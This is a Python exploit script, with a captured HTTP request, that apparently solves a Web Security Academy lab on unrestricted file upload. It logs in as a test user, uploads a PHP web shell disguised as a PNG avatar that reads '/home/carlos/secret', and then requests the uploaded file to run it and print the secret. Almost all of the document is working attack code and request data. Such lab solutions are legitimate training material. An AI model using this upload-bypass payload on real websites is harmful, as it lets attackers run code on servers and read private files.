'''
POST /my-account/avatar HTTP/2
Host: 0ad200dc049b69cd82dd4cbc00ec00b5.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------346373362710128756903227984168
Content-Length: 545
Origin: https://0ad200dc049b69cd82dd4cbc00ec00b5.web-security-academy.net
Connection: keep-alive
Referer: https://0ad200dc049b69cd82dd4cbc00ec00b5.web-security-academy.net/my-account?id=wiener
Cookie: session=rqONbFupyv7wmyRJ5LC45HDqG5CYl59D
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
TE: trailers

-----------------------------346373362710128756903227984168
Content-Disposition: form-data; name="avatar"; filename="payload.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------346373362710128756903227984168
Content-Disposition: form-data; name="user"

wiener
-----------------------------346373362710128756903227984168
Content-Disposition: form-data; name="csrf"

FiYtjjHgycFwdCzfU5hIE1YKzNjDAP98
-----------------------------346373362710128756903227984168--

'''

import requests
import bs4

DOMAIN = '0ad200dc049b69cd82dd4cbc00ec00b5.web-security-academy.net'
headers = {
    'HOST': DOMAIN,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'TE': 'trailers'
}

def get_session_cookie():
    url = f'https://{DOMAIN}/login'

    response = requests.get(url, headers=headers)
    session_cookie = response.cookies['session']

    print('SESSION: ', session_cookie)
    return session_cookie

def get_csrf_token(url, session_cookie):
    cookies = {
        'session': session_cookie
    }

    response = requests.get(url, headers=headers, cookies=cookies)
    
    soup = bs4.BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']

    print('CSRF: ', csrf_token)
    return csrf_token

def login():
    url = f'https://{DOMAIN}/login'

    cookies = {
        'session': get_session_cookie()
    }

    csrf_token = get_csrf_token(url, cookies['session'])
    data = {
        'csrf': csrf_token,
        'username': 'wiener',
        'password': 'peter'
    }

    response = requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=False)

    return response.cookies['session']

def upload_avatar():
    url = f'https://{DOMAIN}/my-account/avatar'

    session_cookie = login()
    cookies = {
        'session': session_cookie
    }
    files = {
        'avatar': ('payload.php', '<?php echo file_get_contents(\'/home/carlos/secret\'); ?>', 'image/png')
    }
    data = {
        'user': 'wiener',
        'csrf': get_csrf_token(f"https://{DOMAIN}/my-account", session_cookie)
    }

    response = requests.post(url, headers=headers, cookies=cookies, files=files, data=data)

    print(response.text)

    execute_payload()


def execute_payload():
    url = f'https://{DOMAIN}/files/avatars/payload.php'
    response = requests.get(url, headers=headers)

    print("OUTPUT OF PAYLOAD: ", response.text)

upload_avatar()